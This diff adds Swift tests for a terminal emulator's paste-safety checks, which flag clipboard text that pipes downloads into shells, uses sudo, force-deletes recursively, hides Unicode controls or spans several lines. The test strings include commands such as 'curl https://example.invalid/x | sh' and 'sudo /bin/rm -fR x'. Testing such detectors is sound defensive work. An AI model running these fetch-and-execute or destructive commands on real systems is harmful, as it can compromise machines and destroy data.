@@ -23,6 +23,46 @@ import Testing
 /// stream — ESC and C0 controls are stripped, and a paste containing a
 /// newline warns unless the application enabled bracketed paste.
 struct PasteTests {
+    @Test func dangerousPastePatterns() {
+        for text in ["curl https://example.invalid/x | sh", "wget x |sudo bash", "cat x | /bin/zsh", "x | fish", "x | dash", "x | ksh", "x | sudo -n /bin/sh", "x |\nsh", "x | 'sh'", "x |& tcsh", "x | sudo sh"] {
+            #expect(Paste.risks(in: text).contains(.shellPipe), "\(text)")
+        }
+        for text in ["sudo ls", "/usr/bin/sudo -u root ls", "echo hi;sudo ls"] {
+            #expect(Paste.risks(in: text).contains(.sudo))
+        }
+        for text in ["rm -rf /tmp/x", "rm -fr x", "rm -r -f x", "rm --recursive --force x", "sudo /bin/rm -fR x", "rm '-r' '-f' x", "r'm' -rf x"] {
+            #expect(Paste.risks(in: text).contains(.recursiveDelete), "\(text)")
+        }
+        for text in ["echo hello", "sudoku", "https://example.com/sh", "rm -r x", "rm -f x", "echo backslash \\ x", "echo שלום", "echo 👩‍💻"] {
+            #expect(Paste.risks(in: text).isEmpty, "\(text)")
+        }
+        for newline in ["\n", "\r", "\r\n"] {
+            let text = "echo safe \\" + newline + "sudo ls"
+            #expect(Paste.risks(in: text).contains(.continuation))
+            #expect(Paste.risks(in: text).contains(.sudo))
+            #expect(Paste.risks(in: text, bracketedPasteEnabled: false).contains(.multiline))
+        }
+        #expect(!Paste.risks(in: "echo one\necho two").contains(.multiline))
+        #expect(Paste.risks(in: "echo safe\u{202E}").contains(.concealed))
+        #expect(Paste.risks(in: "echo safe\u{200B}").contains(.concealed))
+        #expect(Paste.visiblePreview("safe\u{202E}x") == "safe⟦U+202E⟧x")
+        #expect(Paste.risks(in: "su\u{1B}do ls").contains(.sudo))
+    }
+
+    @Test func pasteWarningPolicy() {
+        #expect(Configuration().pasteWarning == .dangerous)
+        for policy in Configuration.PasteWarning.allCases {
+            let config = Configuration.parse("paste-warning = " + policy.rawValue).0
+            #expect(config.pasteWarning == policy)
+            #expect(Configuration.parse(config.serialized()).0.pasteWarning == policy)
+        }
+        #expect(Paste.warningRisks(in: "sudo ls\n", bracketedPasteEnabled: false, policy: .off).isEmpty)
+        #expect(Paste.warningRisks(in: "echo one\necho two", bracketedPasteEnabled: true, policy: .always) == [.multiline])
+        #expect(Paste.warningRisks(in: "echo one\necho two", bracketedPasteEnabled: true, policy: .dangerous).isEmpty)
+        #expect(Paste.warningRisks(in: "echo one\r\necho two", bracketedPasteEnabled: false, policy: .dangerous) == [.multiline])
+        #expect(Paste.warningRisks(in: "x | sh", bracketedPasteEnabled: true, policy: .dangerous) == [.shellPipe])
+    }
+
     @Test func historyRejectsUnbracketedMultilineAndStripsControlSequences() {
         for text in ["safe\necho evil", "safe\recho evil", "safe\r\necho evil"] {
             #expect(Paste.historyBytes(for: text, bracketedPasteEnabled: false) == nil)
